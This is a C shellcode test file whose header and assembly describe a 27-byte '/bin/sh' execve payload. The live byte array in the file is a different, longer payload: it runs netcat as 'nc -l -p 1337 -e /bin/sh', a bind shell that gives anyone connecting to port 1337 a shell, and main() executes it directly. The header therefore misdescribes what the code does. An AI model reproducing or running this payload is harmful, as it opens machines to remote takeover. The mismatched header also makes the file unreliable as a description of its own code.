/*
 * Execute /bin/sh - 27 bytes
 * Dad` <3 baboon
;rdi            0x4005c4 0x4005c4
;rsi            0x7fffffffdf40   0x7fffffffdf40
;rdx            0x0      0x0
;gdb$ x/s $rdi
;0x4005c4:        "/bin/sh"
;gdb$ x/s $rsi
;0x7fffffffdf40:  "\304\005@"
;gdb$ x/32xb $rsi
;0x7fffffffdf40: 0xc4    0x05    0x40    0x00    0x00    0x00    0x00    0x00
;0x7fffffffdf48: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
;0x7fffffffdf50: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
;0x7fffffffdf58: 0x55    0xb4    0xa5    0xf7    0xff    0x7f    0x00    0x00
;
;=> 0x7ffff7aeff20 <execve>:     mov    eax,0x3b
;   0x7ffff7aeff25 <execve+5>:   syscall
;

main:
    ;mov rbx, 0x68732f6e69622f2f
    ;mov rbx, 0x68732f6e69622fff
    ;shr rbx, 0x8
    ;mov rax, 0xdeadbeefcafe1dea
    ;mov rbx, 0xdeadbeefcafe1dea
    ;mov rcx, 0xdeadbeefcafe1dea
    ;mov rdx, 0xdeadbeefcafe1dea
    xor eax, eax
    mov rbx, 0xFF978CD091969DD1
    neg rbx
    push rbx
    ;mov rdi, rsp
    push rsp
    pop rdi
    cdq
    push rdx
    push rdi
    ;mov rsi, rsp
    push rsp
    pop rsi
    mov al, 0x3b
    syscall
 */

#include <stdio.h>
#include <string.h>

char code[] = "\x48\x31\xd2\x48\xbf\xff\x2f\x62\x69\x6e\x2f\x6e\x63"
              "\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb9\xff\x2f\x62"
              "\x69\x6e\x2f\x73\x68\x48\xc1\xe9\x08\x51\x48\x89\xe1"
              "\x48\xbb\xff\xff\xff\xff\xff\xff\x2d\x65\x48\xc1\xeb"
              "\x30\x53\x48\x89\xe3\x49\xba\xff\xff\xff\xff\x31\x33"
              "\x33\x37\x49\xc1\xea\x20\x41\x52\x49\x89\xe2\x49\xb9"
              "\xff\xff\xff\xff\xff\xff\x2d\x70\x49\xc1\xe9\x30\x41"
              "\x51\x49\x89\xe1\x49\xb8\xff\xff\xff\xff\xff\xff\x2d"
              "\x6c\x49\xc1\xe8\x30\x41\x50\x49\x89\xe0\x52\x51\x53"
              "\x41\x52\x41\x51\x41\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

//char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main()
{
    printf("len:%d bytes\n", strlen(code));
    (*(void(*)()) code)();
    return 0;
}





